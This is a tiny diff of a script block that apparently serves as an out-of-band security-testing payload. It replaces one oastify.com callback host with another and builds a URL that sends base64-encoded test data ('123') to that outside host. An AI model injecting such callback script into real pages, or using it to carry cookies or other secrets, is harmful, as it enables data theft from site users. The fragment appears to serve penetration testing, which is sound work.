@@ -1,5 +1,5 @@
 <script>
-	var url = "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/?testing=" + btoa("123");
+	var url = "https://ek2huu9sha0phszjg3mpkmuij9p0dr1g.oastify.com/?testing=" + btoa("123");
 	function reqListener() {
 		console.log("done");
 	};
